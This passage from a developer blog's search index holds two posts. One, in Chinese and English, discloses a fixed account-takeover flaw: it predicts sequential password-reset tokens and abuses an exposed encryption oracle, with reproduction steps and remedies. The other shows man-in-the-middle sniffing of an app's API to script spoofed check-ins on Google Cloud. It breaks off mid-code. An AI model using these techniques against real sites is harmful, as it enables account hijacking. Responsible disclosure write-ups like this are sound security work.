首先先輸入自己的信箱進行重設密碼操作 再輸入想入侵帳號的信箱，一樣進行重設密碼操作以上兩個操作都會寄出重設密碼驗證信。進到自己的信箱去收自己那一封重設密碼驗證信。變更密碼連結為以下網址格式：https://zhgchg.li/resetPassword.php?auth=PvrrbQWBGDQ3LeSBBydPvrrbQWBGDQ3LeSBByd 就是此次重設密碼操作的驗證令牌。但我在觀察網站上驗證碼圖片時發現驗證碼圖片的連結格式也是類似：https://zhgchg.li/captchaImage.php?auth=6EqfSZLqDc6EqfSZLqDc 顯示出 5136 。那把我們的密碼重設 Token 塞進去會怎樣？管他的！ 塞塞看！ Bingo!但驗證碼圖片太小，無法得到完整的資訊。我們繼續找可利用的點…剛好網站為了防止爬蟲侵擾，會將用戶的公開個人資料信箱，用 圖片呈現 ，關鍵字： 圖片呈現！圖片呈現！圖片呈現！立刻打開來看看：個人資料頁網頁原始碼部分我們也得到了類似的網址格式結果：https://zhgchg.li/mailImage.php?mail=V3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVtV3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVt 顯示出 zhgchgli@gmail.com一樣管他的！塞爆！ Bingo!🥳🥳🥳 PvrrbQWBGDQ3LeSBByd = 2395656反解出重設密碼令牌，發現是數字之後我想了該不會是流水號吧。。。於是再輸入一次信箱請求重設密碼，將新收到的信的 Token 解出來，得到 2395657 … what the fxck…還真的是知道是流水後之後就好辦事了，所以一開始的操作才會是先請求自己帳號的重設密碼信，再請求要入侵的目標；因為已經可以預測到下一個請求密碼的 id 了。 再來只需要想辦法將 2395657 換回 Token 令牌即可！好巧不巧又發現個問題 網站在編輯資料時的信箱格式驗證只有前端驗證，後端並未二次驗證格式是否正確…繞過前端驗證後，將信箱改為下一位目標 Fire in the hole!我們得到：https://zhgchg.li/mailImage.php?mail=UTVRZwZuDjMNPLZhBGI這時候將此密碼重設令牌，帶回密碼重設頁面： 入侵成功！繞過驗證重設他人密碼！最後因為沒有二階段登入保護、設備綁定功能；所以密碼被覆蓋掉之後就能直接登入冒用了。事出有因重新梳理一下整件事的流程。 一開始我們要重設密碼，但發現重設密碼的令牌實際上是一個流水號，而非真正的唯一識別 Token 網站濫用加解密功能，沒有區分功能使用；全站幾乎都用同一組 網站存在線上任意加解密入口（等於密鑰報廢） 後端未二次驗證使用者輸入 沒有二階段登入保護、設備綁定功能修正方式 最根本的是重設密碼的令牌應該要是隨機產生的唯一識別 Token 網站加解密部分，應該區分功能使用不同密鑰 避免外部可以任意操作資料加解密 後端應該要驗證使用者輸入 以防萬一，增加二階段登入保護、設備綁定功能總結整個漏洞發現之路令我驚訝，因為很多都是基本的設計問題；雖然功能上單看來說是可以運作，有小洞洞也還算安全；但多個破洞組合起來就會變成一個大洞，在開發上真的要小心謹慎為妙。延伸閱讀 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了 找回密碼之簡訊驗證碼強度安全問題有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,000 Total Views Last Statistics Date: 2025-08-15 | 1,988 Views on Medium." }, { "title": "Revealing a Clever Website Vulnerability Discovered a Few Years Ago", "url": "/posts/zrealm-dev/en/revealing-a-clever-website-vulnerability-discovered-a-few-years-ago-142244e5f07a/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, website-security-test, capture-the-flag", "date": "2021-02-22 21:27:06 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Revealing a Clever Website Vulnerability Discovered a Few Years AgoWebsite security ...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Revealing a Clever Website Vulnerability Discovered a Few Years AgoWebsite security issues caused by the combination of multiple vulnerabilitiesPhoto by Tarik HaigaIntroductionA few years ago, while still supporting web development, I was assigned the task of organizing a CTF competition for the internal engineering team; initially, I thought of organizing teams based on the company’s products for mutual attacks and defenses. However, as the organizer, I wanted to first understand the level of knowledge, so I conducted penetration tests on the various products under the company; I wanted to see how many vulnerabilities I could find to ensure the event would run smoothly. However, due to limited competition time and significant differences between engineering areas, I ultimately decided to create questions based on common foundational knowledge and interesting directions. Interested friends can refer to my previous article “How to Create an Interesting Engineering CTF Competition,” which contains many creative questions!Vulnerabilities FoundI found a total of four vulnerabilities across three products. In addition to the issues discussed in this article, I also discovered the following three common website vulnerabilities: Never Trust The Client!This is a basic issue where the frontend directly sends the ID to the backend, and the backend accepts it without verification; it should be changed to verify a Token. Password Reset Design FlawI actually forgot the specifics, but I remember it was a programming flaw that allowed the password reset process to bypass email verification. XSS Issue The Vulnerability Discussed in This ArticleThe search method was entirely black-box testing, and the only product where I found the XSS issue was one I had participated in developing; I had no involvement with the code of the others.Current Status of the VulnerabilitiesAs a white-hat hacker, I reported all the issues I found to the engineering team immediately, and they have been fixed. Now that two years have passed, I think it’s time to make this public; however, considering the position of my former company, I will not mention which product had this vulnerability. Everyone can just refer to the process and reasons for discovering this vulnerability!Consequences of the VulnerabilityThis vulnerability allows an attacker to change the target user’s password at will and log in to the target user’s account using the new password, thereby stealing personal data and engaging in illegal activities.Main Causes of the VulnerabilityAs the title suggests, this vulnerability was triggered by a combination of multiple factors, including: Account login does not support two-factor authentication or device binding Password reset verification uses a serial number The website’s data encryption feature has a decryption vulnerability Misuse of encryption and decryption functions Incorrect design of the verification token The backend does not re-verify the correctness of the fields User email on the platform is public informationHow to Reproduce the VulnerabilitySince user emails on the platform are public information, we first browse the target account to be hacked; after knowing the email, we go to the password reset page. First, enter your own email to initiate the password reset process. Then, enter the email of the account you want to hack and also initiate the password reset process.Both of these actions will send out a password reset verification email.Go to your own email to receive the password reset verification email.The password change link has the following URL format:https://zhgchg.li/resetPassword.php?auth=PvrrbQWBGDQ3LeSBBydPvrrbQWBGDQ3LeSBByd is the verification token for this password reset operation.However, while observing the verification code image on the website, I found that the link format for the verification code image is also similar:https://zhgchg.li/captchaImage.php?auth=6EqfSZLqDc6EqfSZLqDc reveals 5136.So what happens if we plug our password reset Token into it? Who cares! Let’s try it! Bingo!But the verification code image is too small to obtain complete information.Let’s continue to find exploitable points…Coincidentally, the website, in order to prevent crawler interference, presents users’ public personal data emails as images, keyword: image presentation! image presentation! image presentation!Let’s open it up and take a look:Personal Information PageWebpage Source Code PartWe also obtained a similar URL format result:https://zhgchg.li/mailImage.php?mail=V3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVtV3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVt reveals zhgchgli@gmail.com.Again, who cares! Let’s try it! Bingo!🥳🥳🥳 PvrrbQWBGDQ3LeSBByd = 2395656After Decoding the Password Reset Token and Discovering It’s a NumberI thought, could it be a serial number…So I requested a password reset again using the email to obtain the new token from the email, which turned out to be 2395657… what the fxck… it really is.Once I knew it was a serial number, things became easier. That’s why the initial operation was to first request the password reset email for my own account, then for the target account; because I could already predict the next password request ID. Next, I just need to find a way to convert 2395657 back to the Token!Coincidentally, I Discovered Another Issue The website only performs frontend validation for the email format when editing data; the backend does not re-verify whether the format is correct…Bypassing the frontend validation, I changed the email to the next target. Fire in the hole!We got:https://zhgchg.li/mailImage.php?mail=UTVRZwZuDjMNPLZhBGIAt this point, take this password reset token back to the password reset page: Hacking successful! Bypassed verification to reset someone else’s password!In the end, due to the lack of two-factor login protection and device binding features, once the password was overwritten, I could log in directly and impersonate the user.The Root of the IssueLet’s review the entire process. Initially, we wanted to reset the password, but found that the password reset token was actually a serial number, not a true unique identifier Token. The website misused encryption and decryption functions, not distinguishing between different uses; almost the entire site used the same set. The website had an online arbitrary encryption and decryption entry (equivalent to key compromise). The backend did not re-verify user input. There was no two-factor login protection or device binding feature.Correction Methods Fundamentally, the password reset token should be a randomly generated unique identifier Token. The website’s encryption and decryption parts should use different keys for different functions. Prevent external arbitrary operations on data encryption and decryption. The backend should verify user input. To be safe, add two-factor login protection and device binding features.ConclusionThe entire journey of discovering this vulnerability surprised me because many of them were basic design issues; although the functionality might seem to work at first glance and have minor holes that still seem safe, multiple small holes combined can create a big hole. It’s really important to be cautious during development.Further Reading How to Create an Interesting Engineering CTF Competition APP Uses HTTPS for Transmission, but Data Still Gets Stolen The Security Issues of SMS Verification Codes for Password RecoveryIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,000 Total Views Last Statistics Date: 2025-08-15 | 1,988 Views on Medium." }, { "title": "使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事", "url": "/posts/zrealm-dev/%E4%BD%BF%E7%94%A8-python-google-cloud-platform-line-bot-%E8%87%AA%E5%8B%95%E5%9F%B7%E8%A1%8C%E4%BE%8B%E8%A1%8C%E7%91%A3%E4%BA%8B-70a1409b149a/", "categories": "ZRealm Dev.", "tags": "google-cloud-platform, cloud-functions, cloud-scheduler, ios-app-development, python", "date": "2021-02-20 19:55:51 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事以簽到獎勵 APP 為例，打造每日自動簽到腳本Photo by Paweł Czerwiński起源一直以來都有使用 Pytho...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事以簽到獎勵 APP 為例，打造每日自動簽到腳本Photo by Paweł Czerwiński起源一直以來都有使用 Python 做小工具的習慣；有做正經的，工作上自動爬數據、產報表，也有不正經的，排程自動查想要的資訊或是交給腳本完成本來要手動執行的動作。一直以來「自動」這件事，我都很粗暴直接開一台電腦掛著 Python 腳本讓他掛著跑；優點是簡單方便，缺點是要有台設備接著網路接著電；就算是樹莓派也是要消耗著微量的電費網路錢，還有也不能遠端控制啟動或關閉（其實可以，但很麻煩）；這次趁著工作空擋，研究了一下免費&amp;上雲端的方法。目標 將 Python 腳本搬到雲端執行、定時自動執行、可透過網路開啟/關閉。 本篇以我耍的小聰明，針對簽到獎勵型 APP 撰寫的自動完成簽到的腳本為例，能每日自動幫我簽到，我不用在特別打開 APP 使用；並在執行完成後發通知給我。完成通知！本篇章節順序 使用 Proxyman 進行 Man in the middle attack API 嗅探 撰寫 Python 腳本，偽造 APP API 請求（模擬簽到動作） 將 Python 腳本搬到 Google Cloud 上 在 Google Cloud 設定自動排程 因涉及到敏感領域本篇不會告知是哪個簽到獎勵型 APP，大家可以延伸自行使用 如果只想了解 Python 怎麼串自動執行可跳過前半段 Man in the middle attack API 嗅探部分，從第 3 章看起 。使用到的工具 Proxyman ：Man in the middle attack API 嗅探 Python ：撰寫腳本 Linebot ：發送腳本執行結果通知給自己 Google Cloud Function ：Python 腳本寄存服務 Google Cloud Scheduler ：自動排程服務1.使用 Proxyman 進行 Man in the middle attack API 嗅探之前有發過一篇「 APP有用HTTPS傳輸，但資料還是被偷了。 」的文章，道理類似，不過這次改用 Proxyman 取代 mitmproxy；同樣免費，但更好用。 到官網 https://proxyman.io/ 下載 Proxyman 工具 下載完後啟動 Proxyman，安裝 Root 憑證（為了做 Man in the middle attack 解包 https 流量內容）「Certificate 」-&gt;「 Install Certificate On this Mac」-&gt;「Installed &amp; Trusted」電腦的 Root 憑證裝好後換手機的：「Certificate 」-&gt;「 Install Certificate On iOS」-&gt;「Physical Devices…」依照指示在手機上掛好 Proxy 並完成憑證安裝及啟用。 在手機上打開想要嗅探 API 傳輸內容的 APP這時候 Mac 上的 Proxyman 就會出現嗅探到的流量，點擊裝置 IP 下想要查看的 APP API 網域；第一次查看需要先點「Enable only this domain」之後的流量才能被解包出來。「Enable only this domain」後就能看到新攔截的流量就會出現原始的 Request、Response 資訊： 我們使用此方法嗅探 APP 上操作簽到時打了哪隻 API EndPoint 及帶了哪些資料，將這些資訊記錄下來，等下使用 Python 直接模擬請求。 ⚠️要注意有的 APP token 資訊可能會換，導致日後 Python 模擬請求失效，還要多了解 APP token 交換的方式。 ⚠️如果確定 Proxyman 有正常運作，但在掛 Proxyman 的情況下 APP 無法發出請求，代表 APP 可能有做 SSL Pining；目前無解，只能放棄。 ⚠️APP 開發者想知道怎麼防範嗅探可參考 之前的文章 。這邊假設我們得到的資訊如下：POST /usercenter HTTP/1.1Host: zhgchg.liContent-Type: application/x-www-form-urlencodedCookie: PHPSESSID=dafd27784f94904dd586d4ca19d8ae62Connection: keep-aliveAccept: */*User-Agent: (iPhone12,3;iOS 14.5)Content-Length: 1076Accept-Language: zh-twAccept-Encoding: gzip, deflate, brAuthToken: 123452. 撰寫 Python 腳本，偽造 APP API 請求（模擬簽到動作） 在撰寫 Python 腳本之前，我們可先使用 Postman 調試一下參數，觀察看看哪個參數是必要的或是有時效會改變；但要直接照搬也可以。checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: return \"CheckIn Success!\" else: return result['message'] except Exception as e: return str(e) ⚠️ main(args) 這邊的 args 用途後面會講，如果要在本地測試直接帶 main(True) 就好。使用 Requests 套件幫我們執行 HTTP Request，如果出現：ImportError: No module named requests請先使用 pip install requests 安裝套件。加上執行結果 Linebot 通知：這部分我做的很簡單，僅共參考，僅通知自己。 前往&amp;啟用 Line Developers Console 開發者 建立一個 Provider 選擇「Create a Messaging API channel」下一步填好基本訊息後按「Create」送出建立。 建立好之後在第一個「Basic settings」Tab 下面找到「Your user ID」區塊，這就是你的 User ID 建立好之後，選擇「Messaging API」Tab，掃描 QRCode 將機器人加入好友。 繼續往下滾找到「Channel access token」區塊，點擊「Issue」產生 token。 複製下來產生出來的 Token，我們有這組 Token 就能發訊息給使用者。 有了 User Id 跟 Token 之後我們就能發訊息給自己了。 因沒有要做其他功能所以連 python line sdk 都不用裝，直接打 http 發。串上之前的 Python 腳本後…checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: sendLineNotification(\"CheckIn Success!\") return \"CheckIn Success!\" else: sendLineNotification(result['message']) return result['message'] except Exception as e: sendLineNotification(str(e)) return str(e) def sendLineNotification(message): data = { \"to\" : \"這邊帶你的 User ID\", \"messages\" : [ { \"type\" : \"text\", \"text\" : message } ] } headers = { \"Content-Type\" : \"application/json\", \"Authorization\" : \"這邊帶channel access token\" } request = requests.post('https://api.line.me/v2/bot/message/push',json = data, headers = headers)測看看通知有沒有發成功：Success! 小插曲，通知部分我本來是想用 Gmail SMTP 用信件來發，結果上到 Google Cloud 後發現無法使用…3. 將 Python 腳本搬到 Google Cloud 上前面基本的講完了，正式進入本篇重頭戲；將 Python 腳本搬上雲端。這部分我一開始向中的是 Google Cloud Run 但用了下覺得太複雜，我實際懶得研究，因為我的需求太小用不到這麼多功能；所以 我用的是 Google Cloud Function serverless 方案；實際上比較常用來做的是構建 serverless web 服務。 如果沒使用過 Google Cloud 的朋友，請先前往 主控台 新增好專案＆設定好帳單資訊 在專案主控台首頁，資源的地方點擊「Cloud Functions」 上方選擇「建立函式」 輸入基本資訊 ⚠️記下「 觸發網址」區域可選： US-WEST1 、 US-CENTRAL1 、 US-EAST1 可享 Cloud Storage 服務免費額度。 asia-east2 (Hong Kong) 靠我們比較近，但需要支付微微的 Cloud Storage 費用。 ⚠️建立 Cloud Functions 時會需要 Cloud Storage 寄存程式碼。 ⚠️詳細計價方式請參考文末。觸發條件選： HTTP驗證： 依需求，我希望我能從外部點連結執行腳本，所以選擇「允許未經驗證的叫用」；如果選擇需要驗證，後續 Scheduler 服務也要做相應設定。變數、網路及進階設定可在變數中設定變數給 Python 使用（這樣參數有變動就不用改到 Python 程式碼）：在 Python 中調用的方式：import osdef main(request): return os.environ.get('test', 'DEFAULT VALUE')其他設定都不需要動，直接「儲存」-&gt;「下一步」。 執行階段選「Python 3.x」並將寫好的 Python 腳本貼上，進入點改成「main」補充 main(args) ，同前述，此項服務比較是用來做 serverless web；所以 args 實際是 Request 物件，你能從其中拿到 http get query 及 http post body 資料，具體方式如下：取得 GET Query 資訊：request_args = args.argsexample: ?name=zhgchgli =&gt; request_args = [“name”:”zhgchgli”]取得 POST Body 資料：request_json = request.get_json(silent=True)example: name=zhgchgli =&gt; request_json = [“name”:”zhgchgli”]如果使用 Postman 測試 POST 記得使用「Raw+JSON」POST 資料，否則不會有東西： 程式碼部分 OK 之後，切換到「requirements.txt」輸入有用到的套件依賴：我們使用「request」這個套件幫我們打 API，此套件不在原生 Python 庫裡面；所以我們要在這裡加上去：requests&gt;=2.25.1這邊指定版本 ≥ 2.25.1，也可不指定只輸入 requests 安裝最新版。 都 OK 之後點擊「部署」開始部署。需要花約 1~3 分鐘的時間等他部署完成。 部署完成後可由前面記下的「 觸發網址 」前去執行查看是否正確運行，或使用「動作」-&gt;「測試函式」進行測試如果出現 500 Internal Server Error 則代表程式有錯，可點擊名稱進入查看「紀錄」，在其中找到原因：UnboundLocalError: local variable 'db' referenced before assignment 點擊名稱進入後也可按「編輯」修改腳本內容 測試沒問題就完成了！我們已經順利將 Python 腳本搬上雲端。補充關於變數部分依照我們的需求，我們需要能有個地方存放、讀取簽到 APP 的 token；因為 token 可能會失效；需要重新要求並寫入共下次執行時使用。想要從外部動態傳入變數到腳本中有以下方法： [Read Only] 前述所提到的，執行階段環境變數 [Temp] Cloud Functions 有提供一個 /tmp 目錄共執行時寫入、讀取檔案，但結束後就會刪除，詳情請參考 官方文件 。 [Read Only] GET/POST 傳送資料 [Read Only] 放入附加檔案在程式中使用相對路徑 ./ 就能讀取到， 僅限讀取無法動態修改 ；要修改只能在控制台這修改＆重新部署。 想要可以讀取、動態修改就需要串接其他 GCP 服務，例如：Cloud SQL、Google Storage、Firebase Cloud Firestore… [Read &amp; Write] 這邊我選擇的是 Firebase Cloud Firestore 因為目前只有此方案有免費額度使用。按照 入門步驟 ，建立好 Firebase 專案後；進入 Firebase 後台：在左方選單列找到「 Cloud Firestore 」-&gt;「 新增集合 」輸入集合 ID。輸入資料內容。一個集合可以有多個文件，每個文件可以有各自的欄位內容；使用上非常彈性。在 Python 中使用：請先到 GCP控制台 -&gt; IAM與管理 -&gt; 服務帳戶 ，按照以下步驟下載身份驗證私鑰文件：首先選擇帳號：下方「新增金鑰」-&gt;「建立新的金鑰」選擇「JSON」下載檔案。將此 JSON 檔案放到同 Python 的專案目錄下。本地開發環境下：pip install --upgrade firebase-admin安裝 firebase-admin 套件。在 Cloud Functions 上要在 requirements.txt 中多加入 firebase-admin 。環境弄好後，可以來讀取我們剛剛新增的數據了：firebase_admin.py:import firebase_adminfrom firebase_admin import credentialsfrom firebase_admin import firestoreif not firebase_admin._apps: cred = credentials.Certificate('./身份驗證.json') firebase_admin.initialize_app(cred)# 因若重複 initialize_app 會報以下錯誤# providing an app name as the second argument. In most cases you only need to call initialize_app() once. But if you do want to initialize multiple apps, pass a second argument to initialize_app() to give each app a unique name.# 所以安全起見在 initialize_app 前先檢查是否已 initdb = firestore.client()ref = db.collection(u'example') //集合名稱stream = ref.stream()for data in stream: print(\"id:\"+data.id+\",\"+data.to_dict()) 如果是在 Cloud Functions 上除了可以把 身份驗證 JSON 檔一起上傳上去，也可以在使用時將連接語法改成以下使用：cred = credentials.ApplicationDefault()firebase_admin.initialize_app(cred, { 'projectId': project_id,})db = firestore.client() 如果出現 Failed to initialize a certificate credential. ，請檢查身份驗證 JSON 是否正確。新增、刪除更多操作請參考 官方文件 。4. 在 Google Cloud 設定自動排程有了腳本之後再來是要讓他自動執行才能達到我們的最終目標。 前往 Google Cloud Scheduler 控制台首頁 上方「建立工作」 輸入工作基本資料執行頻率： 同 crontab 輸入方式，如果你對 crontab 語法不熟，可以直接使用 crontab.guru 這個神器網站 ：他能很直白的翻譯給你所設定的語法實際意思。（點 next 可查看下次執行時間） 這邊我設定 15 1 * * * ，因為簽到每天只需要執行一次，設在每日凌晨 1:15 執行。網址部分： 輸入前面記下的「 觸發網址 」時區： 輸入「台灣」，選擇台北標準時間HTTP 方法： 照前面 Python 程式碼我們用 Get 就好如果前面有設「驗證」 記得展開「SHOW MORE」進行驗證設定。都填好後 ，按下「 建立 」。 建立成功後可選擇「立即執行」測試一下正不正常。 可查看執行結果、上次執行日期 ⚠️ 請注意，執行結果「失敗」僅針對 web status code 是 400~500 或 python 程式有錯誤。大功告成！我們已達成將例行任務 Python 腳本上傳到雲端＆設定自動排成自動執行的目標。計價方式還有一部分很重要，就是計價方式；Google Cloud、Linebot 都不是全免費服務，所以了解收費方式很重要；不然為了一個小小的腳本，付出太多的金錢那不如電腦開著掛著跑哩。Linebot參考 官方定價 資訊，一個月 500 則內免費。Google Cloud Functions參考 官方定價 資訊，每月有 200 萬次叫用、400,000 GB/秒和 200,000 GHz/秒的運算時間、 5 GB 的網際網路輸出流量。Google Firebase Cloud Firestore參考 官方定價 資訊，有 1 GB 大小容量、每月 10 GB 流量、每天 50,000 次讀取、20,000 次寫入/刪除；輕量使用很夠用了！Google Cloud Scheduler參考 官方定價 資訊，每個帳號有 3 項免費工作可設定。 對腳本來說以上免費用量就綽綽有餘啦！Google Cloud Storage 有條件免費東躲西躲，還是躲不掉可能被收費的服務。Cloud Functions 建立好之後會自動建立兩個 Cloud Storage 實體：如果剛剛 Cloud Functions 選擇的是 US-WEST1、US-CENTRAL1 或 US-EAST1 這三個地區則可享有免費使用額度：我是選擇 US-CENTRAL1 沒錯，可以看到第一個 Cloud Storage 實體的地區是 US-CENTRAL1 沒錯，但第二個是寫 美國多個地區 ； 我自已估計這項是會被收費的 。參考 官方定價 資訊，依照主機地區不同有不同的價格。程式碼沒多大，估計應該就是每個月最低收費 0.0X0 元（？ ⚠️以上資訊均為 2021/02/21 時撰寫時紀錄，實際以當前價格為主，僅共參考。計價預算控制通知just in case…假設真的有狀況超出免費用量開始計價，我希望能收到通知；避免可能程式錯誤暴衝造成帳單金額報表卻渾然不知。。。 前往 主控台 找到「 計費功能 」Card：點擊「 查看詳細扣款紀錄 」進入。 展開左邊選單，進入「 預算與快訊 」功能 點擊上方「 設定預算 」 輸入自訂名稱下一步。 金額，輸入「 目標金額 」，可輸入 $1、$10；我們不希望在小東西上花太。下一步。動作這邊可以設定當預算達到多少百分比時會觸發通知。勾選 「 透過電子郵件將快訊傳送給帳單管理員和使用者 」，這樣當條件處發時就能第一時間收到通知。點擊「完成」送出儲存。當預算超過時我們就能馬上就能知道，避免產生更多費用。總結人的精力是有限的，現今科技資訊洪流，每個平台每個服務都想要榨取我們有限的精力；如果能透過一些自動化腳本分擔我們的日常生活，聚沙成塔，讓我們省下更多精力專心在重要的事情之上！延伸閱讀 Slack 打造全自動 WFH 員工健康狀況回報系統 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate APP有用HTTPS傳輸，但資料還是被偷了。 如何打造一場有趣的工程CTF競賽 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。有自動化相關優化需求也歡迎 發案給我 ，謝謝。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 13,657 Total Views Last Statistics Date: 2025-08-15 | 13,322 Views on Medium." }, { "title": "Automating Routine Tasks with Python + Google Cloud Platform + Line Bot", "url": "/posts/zrealm-dev/en/automating-routine-tasks-with-python-google-cloud-platform-line-bot-70a1409b149a/", "categories": "ZRealm Dev.", "tags": "google-cloud-platform, cloud-functions, cloud-scheduler, ios-app-development, python", "date": "2021-02-20 19:55:51 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Automating Routine Tasks with Python+Google Cloud Platform+Line BotUsing a check-in ...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Automating Routine Tasks with Python+Google Cloud Platform+Line BotUsing a check-in reward app as an example, we will create a daily automatic check-in script.Photo by Paweł CzerwińskiOriginI have always had a habit of using Python to create small tools; some are serious, like automatically scraping data and generating reports for work, while others are more casual, such as scheduling automatic checks for desired information or delegating tasks that I would normally perform manually to a script.For a long time, I have been quite brute-force about automation, simply running a Python script on a computer. The advantage is that it’s simple and convenient, but the downside is that you need a device connected to the internet and power. Even a Raspberry Pi consumes a small amount of electricity and internet costs, and it can’t be remotely controlled to start or stop (it can be done, but it’s cumbersome). This time, taking advantage of a break at work, I researched free and cloud-based methods.Goal To run Python scripts in the cloud, execute them automatically on a schedule, and be able to start/stop them via the internet. This article uses a clever trick I devised, writing an automatic check-in script for a check-in reward app that can check in for me daily without needing to open the app; it also sends me a notification after execution.Completion Notification!Chapter Order Using Proxyman for Man-in-the-Middle API sniffing Writing a Python script to spoof the app’s API request (simulating the check-in action) Deploying the Python script to Google Cloud Setting up automatic scheduling in Google Cloud Due to the sensitivity of the topic, this article will not disclose which check-in reward app is being used; readers can extend the knowledge to their own use. If you only want to understand how to automate execution with Python, you can skip the first half about Man-in-the-Middle API sniffing and start from Chapter 3.Tools Used Proxyman: Man-in-the-Middle API sniffing Python: Writing scripts Linebot: Sending notifications of script execution results to myself Google Cloud Function: Hosting service for Python scripts Google Cloud Scheduler: Automatic scheduling service1. Using Proxyman for Man-in-the-Middle API SniffingPreviously, I wrote an article titled “Apps Use HTTPS for Transmission, Yet Data Still Gets Stolen.” which has a similar principle, but this time I used Proxyman instead of mitmproxy; it’s also free but more user-friendly. Download the Proxyman tool from the official website https://proxyman.io/. After downloading, launch Proxyman and install the Root certificate (to perform the Man-in-the-Middle attack and unpack HTTPS traffic content).“Certificate” -&gt; “Install Certificate On this Mac” -&gt; “Installed &amp; Trusted”After installing the Root certificate on the computer, switch to the phone:“Certificate” -&gt; “Install Certificate On iOS” -&gt; “Physical Devices…”Follow the instructions to set up the proxy on your phone and complete the certificate installation and activation. Open the app you want to sniff API transmission content on your phone.At this point, Proxyman on the Mac will display the sniffed traffic. Click on the device IP under the app API domain you want to view; the first time you check, you need to click “Enable only this domain” so that subsequent traffic can be unpacked.After clicking “Enable only this domain,” you will see the intercepted traffic with the original Request and Response information: We use this method to sniff which API endpoint is called and what data is sent when checking in on the app, recording this information to simulate requests directly with Python later. ⚠️ Note that some app tokens may change, causing the Python simulation requests to fail later; you need to understand how the app token exchange works. ⚠️ If you confirm that Proxyman is functioning normally but the app cannot make requests while Proxyman is running, it indicates that the app may have implemented SSL Pinning; currently, there is no solution, and you will have to abandon it. ⚠️ App developers wanting to know how to prevent sniffing can refer to the previous article.Assuming we obtained the following information:POST /usercenter HTTP/1.1Host: zhgchg.liContent-Type: application/x-www-form-urlencodedCookie: PHPSESSID=dafd27784f94904dd586d4ca19d8ae62Connection: keep-aliveAccept: */*User-Agent: (iPhone12,3;iOS 14.5)Content-Length: 1076Accept-Language: zh-twAccept-Encoding: gzip, deflate, brAuthToken: 123452. Writing a Python Script to Spoof the App’s API Request (Simulating the Check-in Action) Before writing the Python script, we can use Postman to debug the parameters and observe which parameters are necessary or may change over time; however, you can also directly copy them.checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: return \"CheckIn Success!\" else: return result['message'] except Exception as e: return str(e) _⚠️ The main(args) here will be explained later; if you want to test locally, just call main(True). _Using the Requests library to execute the HTTP Request, if you encounter:ImportError: No module named requestsPlease install the package first using pip install requests.Adding Linebot Notification for Execution Results:This part is quite simple; I only reference it to notify myself. Go to &amp; enable Line Developers Console. Create a Provider. Choose “Create a Messaging API channel.”Fill in the basic information on the next step and click “Create” to submit. After creation, find the “Your user ID” section under the first “Basic settings” tab; this is your User ID. After creation, select the “Messaging API” tab, scan the QR code to add the bot as a friend. Scroll down to find the “Channel access token” section and click “Issue” to generate the token. Copy the generated token; with this token, we can send messages to users. With the User ID and Token, we can send messages to ourselves. Since there are no other functions to implement, I didn’t even install the Python Line SDK; I just send HTTP requests directly.After integrating with the previous Python script…checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: sendLineNotification(\"CheckIn Success!\") return \"CheckIn Success!\" else: sendLineNotification(result['message']) return result['message'] except Exception as e: sendLineNotification(str(e)) return 